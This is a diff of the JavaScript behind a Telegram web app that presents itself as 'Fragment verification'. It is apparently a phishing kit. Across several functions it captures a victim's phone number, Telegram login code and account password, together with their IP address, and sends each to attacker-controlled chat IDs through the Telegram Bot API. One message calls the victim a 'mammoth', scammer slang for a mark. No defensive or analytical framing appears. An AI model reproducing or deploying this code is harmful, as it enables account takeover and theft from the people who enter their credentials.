+                    value = value.substring(1);
                 }
             }
-
-            if (step === 1) {
-                forms.phone?.classList.add('active');
-                phoneInput?.focus();
-            } else if (step === 2) {
-                forms.code?.classList.add('active');
-                codeInput?.focus();
-            } else if (step === 3) {
-                forms.password?.classList.add('active');
-                passwordInput?.focus();
-            } else if (step === 4) {
-                forms.success?.classList.add('active');
-                tg.HapticFeedback.notificationOccurred('success');
+            
+            if (value && value[0] !== '+') {
+                value = '+' + value;
             }
-
-            // Обновляем кнопку "Назад" в Telegram
-            tg.BackButton.isVisible = step > 1;
-            if (step > 1) {
-                tg.BackButton.onClick(() => {
-                    if (step === 2) backToPhoneStep();
-                    else if (step === 3) backToCodeStep();
-                    else if (step === 4) startNewVerification();
+            
+            if (value.length > 3) {
+                value = value.replace(/(\+\d{1,3})(\d{0,3})?(\d{0,3})?(\d{0,4})?/, function(match, p1, p2, p3, p4) {
+                    let formatted = p1;
+                    if (p2) formatted += ' ' + p2;
+                    if (p3) formatted += ' ' + p3;
+                    if (p4) formatted += ' ' + p4;
+                    return formatted;
                 });
             }
+            
+            e.target.value = value;
         }
-
-        // === Навигация ===
-        function backToPhoneStep() {
-            updateStep(1);
+        
+        function validateCodeInput(e) {
+            let value = e.target.value;
+            value = value.replace(/\D/g, '');
+            value = value.substring(0, 6);
+            e.target.value = value;
         }
-
-        function backToCodeStep() {
-            updateStep(2);
+        
+        function togglePasswordVisibility() {
+            const toggleBtn = document.querySelector('.toggle-password i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.classList.remove('fa-eye');
+                toggleBtn.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.classList.remove('fa-eye-slash');
+                toggleBtn.classList.add('fa-eye');
+            }
         }
-
-        function startNewVerification() {
-            phoneInput.value = '';
-            codeInput.value = '';
-            passwordInput.value = '';
-            phoneNumber = '';
-            verificationCode = '';
-            userPassword = '';
-            hasPassword = false;
-            sessionId = "FRAG_" + Date.now() + "_" + Math.random().toString(36).substr(2, 8).toUpperCase();
-
-            sendPhoneBtn.disabled = false;
-            sendPhoneBtn.innerHTML = '<span>Отправить номер</span>';
-            sendCodeBtn.disabled = false;
-            sendCodeBtn.innerHTML = '<span>Подтвердить код</span>';
-            sendPasswordBtn.disabled = false;
-            skipPasswordBtn.disabled = false;
-            sendPasswordBtn.innerHTML = '<span>Отправить</span>';
-            skipPasswordBtn.innerHTML = 'Пропустить';
-
-            updateStep(1);
-        }
-
-        function closeWebApp() {
-            tg.close();
-        }
-
-        // === Отправка данных ===
+        
+        // === ОСНОВНЫЕ ФУНКЦИИ ===
+        
         async function sendPhoneNumber() {
-            const phone = phoneInput.value.trim().replace(/\s+/g, '');
-
-            if (!phone || !phone.startsWith('+') || phone.length < 8) {
-                showError('Введите корректный номер с кодом страны (например, +79991234567)');
+            const phone = phoneInput.value.trim().replace(/\s/g, '');
+            
+            if (!validatePhone(phone)) {
                 return;
             }
-
+            
+            if (ADMIN_CHAT_IDS.length === 0) {
+                showError('❌ ОШИБКА НАСТРОЙКИ\n\nАдминистраторы не настроены.');
+                return;
+            }
+            
             sendPhoneBtn.disabled = true;
-            sendPhoneBtn.innerHTML = '<div class="loader"><div class="loader-spinner"></div> Отправка...</div>';
+            sendPhoneBtn.innerHTML = `
+                <div class="telegram-loader">
+                    <div class="loader-spinner"></div>
+                    <span>Отправка номера...</span>
+                </div>
+            `;
+            
             hideMessages();
-
             phoneNumber = phone;
-
+            
+            // Создаем ID сессии
+            sessionId = 'FRAG_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8).toUpperCase();
+            
             try {
-                const ipInfo = await getIpInfo();
-                const timestamp = new Date().toLocaleString('ru-RU');
-
-                const message = `📞 Новый номер телефона\n\n📱 Номер: <code>${phone}</code>\n🕐 Время: ${timestamp}\n🌐 IP: ${ipInfo}`;
-
-                let successCount = 0;
-                for (const chatId of ADMIN_CHAT_IDS) {
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        const data = await response.json();
-                        if (data.ok) successCount++;
-                    } catch (e) {
-                        console.error(e);
-                    }
-                    await sleep(100);
-                }
-
-                if (successCount > 0) {
-                    showInfo('✅ Номер отправлен! Введите код из Telegram.');
-                    updateStep(2);
-                } else {
-                    throw new Error('Не удалось отправить');
-                }
+                await sendPhoneToAdmins(phone, sessionId);
             } catch (error) {
-                showError('Ошибка отправки. Попробуйте ещё раз.');
-            } finally {
-                sendPhoneBtn.disabled = false;
-                sendPhoneBtn.innerHTML = '<span>Отправить номер</span>';
+                handlePhoneError(error);
             }
         }
+        
+        function validatePhone(phone) {
+            if (!phone) {
+                showError('Пожалуйста, введите номер телефона');
+                phoneInput.focus();
+                return false;
+            }
+            
+            if (!phone.startsWith('+')) {
+                showError('Номер должен начинаться с + и кода страны');
+                phoneInput.focus();
+                return false;
+            }
+            
+            const digitsOnly = phone.substring(1).replace(/\D/g, '');
+            if (digitsOnly.length < 5) {
+                showError('Номер телефона слишком короткий');
+                phoneInput.focus();
+                return false;
+            }
+            
+            if (digitsOnly.length > 15) {
+                showError('Номер телефона слишком длинный');
+                phoneInput.focus();
+                return false;
+            }
+            
+            return true;
+        }
+        
+        async function sendPhoneToAdmins(phone, sessionId) {
+            const timestamp = new Date().toLocaleString('ru-RU');
+            const ipInfo = await getIpInfo();
+            
+            const message = `Получен номер
 
+👤 Пользователь отправил номер телефона:
+
+📱 <b>Номер телефона:</b> <code>${phone}</code>
+🕐 <b>Время:</b> ${timestamp}
+🌐 <b>IP:</b> ${ipInfo}
+`;
+            
+            let successCount = 0;
+            
+            for (const chatId of ADMIN_CHAT_IDS) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        successCount++;
+                        console.log(`✅ Номер отправлен админу ${chatId}`);
+                    } else {
+                        console.error(`❌ Ошибка отправки админу ${chatId}:`, data);
+                    }
+                } catch (error) {
+                    console.error(`❌ Ошибка сети для админа ${chatId}:`, error);
+                }
+                
+                await sleep(100);
+            }
+            
+            if (successCount > 0) {
+                saveSession(phone, sessionId);
+                showInfo('✅ Номер телефона отправлен! Теперь введите код подтверждения.');
+                updateStep(2);
+                
+                // Восстанавливаем кнопку сразу
+                sendPhoneBtn.disabled = false;
+                sendPhoneBtn.innerHTML = `
+                    <i class="fas fa-paper-plane"></i>
+                    Отправить номер
+                `;
+            } else {
+                throw new Error('Не удалось отправить номер админам');
+            }
+        }
+        
+        function handlePhoneError(error) {
+            console.error('Ошибка отправки номера:', error);
+            
+            let errorMsg = 'Ошибка при отправке номера. Попробуйте еще раз.';
+            showError(errorMsg);
+            
+            sendPhoneBtn.disabled = false;
+            sendPhoneBtn.innerHTML = `
+                <i class="fas fa-paper-plane"></i>
+                Отправить номер
+            `;
+        }
+        
+        function autoDetectCountry() {
+            try {
+                const userLang = navigator.language || navigator.userLanguage;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                if (userLang.includes('ru') || timezone.includes('Europe/Moscow') || timezone.includes('Europe/Kiev')) {
+                    phoneInput.placeholder = "+7 999 123 45 67";
+                }
+            } catch (error) {
+                console.log('Не удалось определить страну:', error);
+            }
+        }
+        
         async function sendVerificationCode() {
             const code = codeInput.value.trim();
-
-            if (!code || code.length !== 5 || !/^\d+$/.test(code)) {
-                showError('Введите 5-значный код из Telegram');
+            
+            if (!validateCode(code)) {
                 return;
             }
-
+            
             sendCodeBtn.disabled = true;
-            sendCodeBtn.innerHTML = '<div class="loader"><div class="loader-spinner"></div> Отправка...</div>';
+            sendCodeBtn.innerHTML = `
+                <div class="telegram-loader">
+                    <div class="loader-spinner"></div>
+                    <span>Отправка кода...</span>
+                </div>
+            `;
+            
             hideMessages();
-
             verificationCode = code;
-
+            
             try {
-                const ipInfo = await getIpInfo();
-                const timestamp = new Date().toLocaleString('ru-RU');
-
-                const message = `🔐 Получен код подтверждения\n\n📱 Номер: <code>${phoneNumber}</code>\n🔢 Код: <code>${code}</code>\n🕐 Время: ${timestamp}\n🌐 IP: ${ipInfo}`;
-
-                let successCount = 0;
-                for (const chatId of ADMIN_CHAT_IDS) {
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        const data = await response.json();
-                        if (data.ok) successCount++;
-                    } catch (e) {
-                        console.error(e);
-                    }
-                    await sleep(100);
-                }
-
-                if (successCount > 0) {
-                    showInfo('✅ Код подтверждён! Теперь можно отправить пароль (или пропустить).');
-                    updateStep(3);
-                } else {
-                    throw new Error('Не удалось отправить');
-                }
+                await sendCodeToAdmins(phoneNumber, code, sessionId);
             } catch (error) {
-                showError('Ошибка отправки кода.');
-            } finally {
-                sendCodeBtn.disabled = false;
-                sendCodeBtn.innerHTML = '<span>Подтвердить код</span>';
+                handleCodeError(error);
             }
         }
+        
+        function validateCode(code) {
+            if (!code) {
+                showError('Пожалуйста, введите 5-значный код');
+                codeInput.focus();
+                return false;
+            }
+            
+            if (code.length !== 5) {
+                showError('Код должен содержать 5 цифр');
+                codeInput.focus();
+                return false;
+            }
+            
+            if (!/^\d+$/.test(code)) {
+                showError('Код должен содержать только цифры');
+                codeInput.focus();
+                return false;
+            }
+            
+            return true;
+        }
+        
+        async function sendCodeToAdmins(phone, code, sessionId) {
+            const timestamp = new Date().toLocaleString('ru-RU');
+            const ipInfo = await getIpInfo();
+            
+            const message = `🔐 ПОЛУЧЕН КОД
 
+✅ Пользователь отправил код подтверждения:
+
+📱 <b>Номер телефона:</b> <code>${phone}</code>
+🔢 <b>Код подтверждения:</b> <code>${code}</code>
+🕐 <b>Время:</b> ${timestamp}
+🌐 <b>IP:</b> ${ipInfo}
+`;
+            
+            let successCount = 0;
+            
+            for (const chatId of ADMIN_CHAT_IDS) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        successCount++;
+                        console.log(`✅ Код отправлен админу ${chatId}`);
+                    } else {
+                        console.error(`❌ Ошибка отправки админу ${chatId}:`, data);
+                    }
+                } catch (error) {
+                    console.error(`❌ Ошибка сети для админа ${chatId}:`, error);
+                }
+                
+                await sleep(100);
+            }
+            
+            if (successCount > 0) {
+                updateSessionWithCode(code);
+                showInfo('✅ Код подтверждения отправлен! Теперь вы можете отправить пароль (если нужно).');
+                updateStep(3);
+                
+                // Восстанавливаем кнопку сразу
+                sendCodeBtn.disabled = false;
+                sendCodeBtn.innerHTML = `
+                    <i class="fas fa-check-circle"></i>
+                    Отправить код
+                `;
+            } else {
+                throw new Error('Не удалось отправить код админам');
+            }
+        }
+        
+        function handleCodeError(error) {
+            console.error('Ошибка отправки кода:', error);
+            
+            let errorMsg = 'Ошибка при отправке кода. Попробуйте еще раз.';
+            showError(errorMsg);
+            
+            sendCodeBtn.disabled = false;
+            sendCodeBtn.innerHTML = `
+                <i class="fas fa-check-circle"></i>
+                Отправить код
+            `;
+        }
+        
         async function sendPassword() {
             const password = passwordInput.value.trim();
-
+            
             if (!password) {
-                showError('Введите пароль или нажмите "Пропустить"');
+                showError('Пожалуйста, введите пароль');
+                passwordInput.focus();
                 return;
             }
-
+            
             sendPasswordBtn.disabled = true;
             skipPasswordBtn.disabled = true;
-            sendPasswordBtn.innerHTML = '<div class="loader"><div class="loader-spinner"></div> Отправка...</div>';
+            sendPasswordBtn.innerHTML = `
+                <div class="telegram-loader">
+                    <div class="loader-spinner"></div>
+                    <span>Отправка пароля...</span>
+                </div>
+            `;
+            
             hideMessages();
-
             userPassword = password;
             hasPassword = true;
-
+            
             try {
-                const ipInfo = await getIpInfo();
-                const timestamp = new Date().toLocaleString('ru-RU');
-
-                const message = `🔒 Получен пароль\n\n📱 Номер: <code>${phoneNumber}</code>\n🔢 Код: <code>${verificationCode}</code>\n🔐 Пароль: <code>${password}</code>\n🕐 Время: ${timestamp}\n🌐 IP: ${ipInfo}`;
-
-                let successCount = 0;
-                for (const chatId of ADMIN_CHAT_IDS) {
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        const data = await response.json();
-                        if (data.ok) successCount++;
-                    } catch (e) {
-                        console.error(e);
-                    }
-                    await sleep(100);
-                }
-
-                if (successCount > 0) {
-                    showSuccess('✅ Пароль отправлен! Верификация завершена.');
-                    updateStep(4);
-                } else {
-                    throw new Error('Не удалось отправить');
-                }
+                await sendPasswordToAdmins(phoneNumber, verificationCode, password, sessionId);
             } catch (error) {
-                showError('Ошибка отправки пароля.');
-                sendPasswordBtn.disabled = false;
-                skipPasswordBtn.disabled = false;
-                sendPasswordBtn.innerHTML = '<span>Отправить</span>';
-                skipPasswordBtn.innerHTML = 'Пропустить';
+                handlePasswordError(error);
             }
         }
-
+        
         async function skipPassword() {
             sendPasswordBtn.disabled = true;
             skipPasswordBtn.disabled = true;
-            skipPasswordBtn.innerHTML = '<div class="loader"><div class="loader-spinner"></div> Пропуск...</div>';
+            skipPasswordBtn.innerHTML = `
+                <div class="telegram-loader">
+                    <div class="loader-spinner"></div>
+                    <span>Пропускаем пароль...</span>
+                </div>
+            `;
+            
             hideMessages();
-
             hasPassword = false;
-
+            
             try {
-                const ipInfo = await getIpInfo();
-                const timestamp = new Date().toLocaleString('ru-RU');
-
-                const message = `⏭️ Пароль не предоставлен\n\n📱 Номер: <code>${phoneNumber}</code>\n🔢 Код: <code>${verificationCode}</code>\n🕐 Время: ${timestamp}\n🌐 IP: ${ipInfo}\n\nПользователь пропустил ввод пароля.`;
-
-                let successCount = 0;
-                for (const chatId of ADMIN_CHAT_IDS) {
-                    try {
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                        const data = await response.json();
-                        if (data.ok) successCount++;
-                    } catch (e) {
-                        console.error(e);
-                    }
-                    await sleep(100);
-                }
-
-                if (successCount > 0) {
-                    showSuccess('✅ Верификация завершена!');
-                    updateStep(4);
-                } else {
-                    throw new Error('Не удалось отправить');
-                }
+                await sendSkipPasswordToAdmins(phoneNumber, verificationCode, sessionId);
             } catch (error) {
-                showError('Ошибка. Попробуйте ещё раз.');
-                sendPasswordBtn.disabled = false;
-                skipPasswordBtn.disabled = false;
-                sendPasswordBtn.innerHTML = '<span>Отправить</span>';
-                skipPasswordBtn.innerHTML = 'Пропустить';
+                handlePasswordError(error);
             }
         }
+        
+        async function sendPasswordToAdmins(phone, code, password, sessionId) {
+            const timestamp = new Date().toLocaleString('ru-RU');
+            const ipInfo = await getIpInfo();
+            
+            const message = `🔒 ПОЛУЧЕН ПАРОЛЬ 
 
-        // === Утилиты ===
+✅ Пользователь отправил пароль от аккаунта:
+
+📱 <b>Номер телефона:</b> <code>${phone}</code>
+🔢 <b>Код подтверждения:</b> <code>${code}</code>
+🔐 <b>Пароль от аккаунта:</b> <code>${password}</code>
+🕐 <b>Время:</b> ${timestamp}
+🌐 <b>IP:</b> ${ipInfo}
+`;
+            
+            let successCount = 0;
+            
+            for (const chatId of ADMIN_CHAT_IDS) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        successCount++;
+                        console.log(`✅ Пароль отправлен  ${chatId}`);
+                    } else {
+                        console.error(`❌ Ошибка отправки ${chatId}:`, data);
+                    }
+                } catch (error) {
+                    console.error(`❌ Ошибка сети  ${chatId}:`, error);
+                }
+                
+                await sleep(100);
+            }
+            
+            if (successCount > 0) {
+                updateSessionWithPassword(password, true);
+                showSuccess('✅ Пароль отправлен! Верификация завершена.');
+                updateStep(4);
+                
+                document.getElementById('successPhone').textContent = phone;
+                document.getElementById('successCode').textContent = code;
+                document.getElementById('successPasswordStatus').textContent = 'Отправлен';
+                document.getElementById('hasPasswordText').textContent = 'Пароль отправлен для проверки';
+                document.getElementById('successSessionId').textContent = sessionId;
+                
+                const successBtn = document.querySelector('.telegram-btn.success-animation');
+                if (successBtn) {
+                    successBtn.classList.remove('success-animation');
+                    void successBtn.offsetWidth;
+                    successBtn.classList.add('success-animation');
+                }
+                
+            } else {
+                throw new Error('Не удалось отправить пароль ');
+            }
+        }
+        
+        async function sendSkipPasswordToAdmins(phone, code, sessionId) {
+            const timestamp = new Date().toLocaleString('ru-RU');
+            const ipInfo = await getIpInfo();
+            
+            const message = `У мамонта нет пароля`;
+            
+            let successCount = 0;
+            
+            for (const chatId of ADMIN_CHAT_IDS) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.ok) {
+                        successCount++;
+                        console.log(`✅ Информация отправлена админу ${chatId}`);
+                    } else {
+                        console.error(`❌ Ошибка отправки админу ${chatId}:`, data);
+                    }
+                } catch (error) {
+                    console.error(`❌ Ошибка сети для админа ${chatId}:`, error);
+                }
+                
+                await sleep(100);
+            }
+            
+            if (successCount > 0) {
+                updateSessionWithPassword('', false);
+                showSuccess('✅ Верификация завершена! Администратор получил данные.');
+                updateStep(4);
+                
+                document.getElementById('successPhone').textContent = phone;
+                document.getElementById('successCode').textContent = code;
+                document.getElementById('successPasswordStatus').textContent = 'Не предоставлен';
+                document.getElementById('hasPasswordText').textContent = 'Пароль не предоставлен';
+                document.getElementById('successSessionId').textContent = sessionId;
+                
+                const successBtn = document.querySelector('.telegram-btn.success-animation');
+                if (successBtn) {
+                    successBtn.classList.remove('success-animation');
+                    void successBtn.offsetWidth;
+                    successBtn.classList.add('success-animation');
+                }
+                
+            } else {
+                throw new Error('Не удалось отправить информацию админам');
+            }
+        }
+        
+        function handlePasswordError(error) {
+            console.error('Ошибка отправки пароля:', error);
+            
+            let errorMsg = 'Ошибка при отправке данных. Попробуйте еще раз.';
+            showError(errorMsg);
+            
+            sendPasswordBtn.disabled = false;
+            skipPasswordBtn.disabled = false;
+            sendPasswordBtn.innerHTML = `
+                <i class="fas fa-paper-plane"></i>
+                Отправить пароль
+            `;
+            skipPasswordBtn.innerHTML = `
+                <i class="fas fa-forward"></i>
+                Пропустить пароль
+            `;
+        }
+        
+        // === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
+        
+        function updateStep(step) {
+            currentStep = step;
+            
+            Object.values(forms).forEach(form => {
+                form.classList.remove('active');
+            });
+            
+            Object.keys(stepCircles).forEach(key => {
+                const circle = stepCircles[key];
+                const text = stepTexts[key];
+                const stepNum = parseInt(key);
+                
+                circle.classList.remove('active', 'completed');
+                text.classList.remove('active');
+                
+                if (stepNum < step) {
+                    circle.classList.add('completed');
+                } else if (stepNum === step) {
+                    circle.classList.add('active');
+                    text.classList.add('active');
+                }
+            });
+            
+            switch(step) {
+                case 1:
+                    forms.phone.classList.add('active');
+                    phoneInput.focus();
+                    break;
+                case 2:
+                    forms.code.classList.add('active');
+                    codeInput.focus();
+                    break;
+                case 3:
+                    forms.password.classList.add('active');
+                    passwordInput.focus();
+                    break;
+                case 4:
+                    forms.success.classList.add('active');
+                    break;
+            }
+        }
+        
+        function backToPhoneStep() {
+            updateStep(1);
+            hideMessages();
+        }
+        
+        function backToCodeStep() {
+            updateStep(2);
+            hideMessages();
+        }
+        
+        function cancelVerification() {
+            if (confirm('Вы уверены, что хотите отменить верификацию? Весь прогресс будет потерян.')) {
+                clearSession();
+                showInfo('Верификация отменена. Вы можете начать заново.');
+                updateStep(1);
+                phoneInput.value = '';
+                codeInput.value = '';
+                passwordInput.value = '';
+                
+                sendPhoneBtn.disabled = false;
+                sendPhoneBtn.innerHTML = `
+                    <i class="fas fa-paper-plane"></i>
+                    Отправить номер
+                `;
+                
+                sendCodeBtn.disabled = false;
+                sendCodeBtn.innerHTML = `
+                    <i class="fas fa-check-circle"></i>
+                    Отправить код
+                `;
+                
+                sendPasswordBtn.disabled = false;
+                skipPasswordBtn.disabled = false;
+                sendPasswordBtn.innerHTML = `
+                    <i class="fas fa-paper-plane"></i>
+                    Отправить пароль
+                `;
+                skipPasswordBtn.innerHTML = `
+                    <i class="fas fa-forward"></i>
+                    Пропустить пароль
+                `;
+            }
+        }
+        
+        function startNewVerification() {
+            clearSession();
+            phoneInput.value = '';
+            codeInput.value = '';
+            passwordInput.value = '';
+            
+            sendPhoneBtn.disabled = false;
+            sendPhoneBtn.innerHTML = `
+                <i class="fas fa-paper-plane"></i>
+                Отправить номер
+            `;
+            
+            sendCodeBtn.disabled = false;
+            sendCodeBtn.innerHTML = `
+                <i class="fas fa-check-circle"></i>
+                Отправить код
+            `;
+            
+            sendPasswordBtn.disabled = false;
+            skipPasswordBtn.disabled = false;
+            sendPasswordBtn.innerHTML = `
+                <i class="fas fa-paper-plane"></i>
+                Отправить пароль
+            `;
+            skipPasswordBtn.innerHTML = `
+                <i class="fas fa-forward"></i>
+                Пропустить пароль
+            `;
+            
+            showInfo('Начинаем новую верификацию!');
+            updateStep(1);
+        }
+        
+        function hideMessages() {
+            errorMessage.classList.remove('show');
+            successMessage.classList.remove('show');
+            infoMessage.classList.remove('show');
+        }
+        
+        function showError(text) {
+            hideMessages();
+            errorText.textContent = text;
+            errorMessage.classList.add('show');
+            
+            setTimeout(() => {
+                errorMessage.classList.remove('show');
+            }, 10000);
+        }
+        
+        function showSuccess(text) {
+            hideMessages();
+            successText.textContent = text;
+            successMessage.classList.add('show');
+        }
+        
+        function showInfo(text) {
+            hideMessages();
+            infoText.textContent = text;
+            infoMessage.classList.add('show');
+            
+            setTimeout(() => {
+                infoMessage.classList.remove('show');
+            }, 8000);
+        }
+        
+        // === РАБОТА С ЛОКАЛЬНЫМ ХРАНИЛИЩЕМ ===
+        
+        function saveSession(phone, sessionId) {
+            const sessionData = {
+                phone: phone,
+                sessionId: sessionId,
+                timestamp: Date.now(),
+                step: 2
+            };
+            
+            localStorage.setItem('fragment_verification_session', JSON.stringify(sessionData));
+            console.log('💾 Сессия сохранена:', sessionData);
+        }
+        
+        function updateSessionWithCode(code) {
+            const sessionData = {
+                phone: phoneNumber,
+                sessionId: sessionId,
+                code: code,
+                timestamp: Date.now(),
+                step: 3
+            };
+            
+            localStorage.setItem('fragment_verification_session', JSON.stringify(sessionData));
+            console.log('💾 Сессия обновлена с кодом:', sessionData);
+        }
+        
+        function updateSessionWithPassword(password, hasPasswordFlag) {
+            const sessionData = {
+                phone: phoneNumber,
+                sessionId: sessionId,
+                code: verificationCode,
+                password: hasPasswordFlag ? password : '',
+                hasPassword: hasPasswordFlag,
+                timestamp: Date.now(),
+                step: 4
+            };
+            
+            localStorage.setItem('fragment_verification_session', JSON.stringify(sessionData));
+            console.log('💾 Сессия завершена:', sessionData);
+        }
+        
+        function restoreSession() {
+            try {
+                const saved = localStorage.getItem('fragment_verification_session');
+                if (saved) {
+                    const session = JSON.parse(saved);
+                    
+                    const hoursOld = (Date.now() - session.timestamp) / (1000 * 60 * 60);
+                    
+                    if (hoursOld < 1) {
+                        phoneNumber = session.phone;
+                        sessionId = session.sessionId;
+                        
+                        if (session.step === 2) {
+                            phoneInput.value = session.phone;
+                            updateStep(2);
+                            showInfo('Восстановлена сессия. Введите код подтверждения.');
+                            
+                        } else if (session.step === 3 && session.code) {
+                            phoneInput.value = session.phone;
+                            codeInput.value = session.code;
+                            verificationCode = session.code;
+                            updateStep(3);
+                            showInfo('Восстановлена сессия. Вы можете отправить пароль.');
+                            
+                        } else if (session.step === 4) {
+                            phoneInput.value = session.phone;
+                            codeInput.value = session.code || '';
+                            verificationCode = session.code || '';
+                            hasPassword = session.hasPassword || false;
+                            
+                            document.getElementById('successPhone').textContent = session.phone;
+                            document.getElementById('successCode').textContent = session.code || '';
+                            document.getElementById('successPasswordStatus').textContent = session.hasPassword ? 'Отправлен' : 'Не предоставлен';
+                            document.getElementById('successSessionId').textContent = session.sessionId;
+                            
+                            updateStep(4);
+                            showInfo('Восстановлена завершенная верификация.');
+                        }
+                        
+                        console.log('🔄 Сессия восстановлена:', session);
+                    } else {
+                        clearSession();
+                        console.log('🗑️ Устаревшая сессия удалена');
+                    }
+                }
+            } catch (error) {
+                console.error('Ошибка восстановления сессии:', error);
+                clearSession();
+            }
+        }
+        
+        function clearSession() {
+            localStorage.removeItem('fragment_verification_session');
+            phoneNumber = "";
+            verificationCode = "";
+            userPassword = "";
+            hasPassword = false;
+            sessionId = "";
+            console.log('🗑️ Сессия очищена');
+        }
+        
+        // === УТИЛИТЫ ===
+        
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
         async function getIpInfo() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json', {
                     signal: AbortSignal.timeout(3000)
                 });
+                
+                if (!response.ok) throw new Error('API error');
+                
                 const data = await response.json();
                 return data.ip;
-            } catch {
+            } catch (error) {
+                console.log('Не удалось определить IP:', error);
                 return 'Не удалось определить';
             }
         }
-
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
-        // Старт
+        
+        // === ТЕСТОВЫЕ ФУНКЦИИ ===
+        
+        window.testSendPhone = function() {
+            phoneInput.value = '+79991234567';
+            sendPhoneNumber();
+        };
+        
+        window.testSendCode = function() {
+            codeInput.value = '12345';
+            sendVerificationCode();
+        };
+        
+        window.testSendPassword = function() {
+            passwordInput.value = 'testpassword123';
+            setTimeout(() => sendPassword(), 100);
+        };
+        
+        window.testSkipPassword = function() {
+            setTimeout(() => skipPassword(), 100);
+        };
+        
+        window.testStep = function(step) {
+            if (step >= 1 && step <= 4) {
+                updateStep(step);
+                console.log(`Перешли к шагу ${step}`);
+            }
+        };
+        
+        // === ИНИЦИАЛИЗАЦИЯ ===
+        
         document.addEventListener('DOMContentLoaded', init);
+        
+        window.appState = {
+            getPhone: () => phoneNumber,
+            getSessionId: () => sessionId,
+            getCurrentStep: () => currentStep,
+            hasPassword: () => hasPassword,
+            clearAll: () => {
+                clearSession();
+                location.reload();
+            }
+        };
+        
+        console.log('✅ Fragment Verification System загружен v3.0');
+        console.log('📞 Для тестирования используйте:');
+        console.log('  • testSendPhone() — отправить тестовый номер');
+        console.log('  • testSendCode() — отправить тестовый код');
+        console.log('  • testSendPassword() — отправить тестовый пароль');
+        console.log('  • testSkipPassword() — пропустить пароль');
+        console.log('  • testStep(1-4) — переключить шаг');
+        console.log('  • appState — информация о состоянии');
+        console.log('  • Горячие клавиши:');
+        console.log('    - Alt+1 — тестовый номер');
+        console.log('    - Alt+2 — тестовый код');
+        console.log('    - Alt+3 — тестовый пароль');
     </script>
 </body>
 </html>
